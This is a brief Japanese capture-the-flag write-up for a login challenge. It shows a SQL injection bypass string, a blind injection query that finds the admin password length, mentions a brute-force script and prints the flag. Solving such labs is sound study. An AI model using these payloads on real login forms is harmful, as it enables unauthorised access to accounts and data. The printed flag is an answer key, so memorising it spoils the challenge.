## 問題文
Login

```
http://ctfq.sweetduet.info:10080/~q6/
```

## 解説
SQLインジェクションの問題

```
id = admin
pass = ' OR 1==1 --
```
でソースを確認できる

パスワード数の特定のインジェクション攻撃
admin' AND (SELECT length(pass) FROM user WHERE id='admin') = 21; --

パスワード総当たり攻撃スクリプトを記述

FLAG_KpWa4ji3uZk6TrPK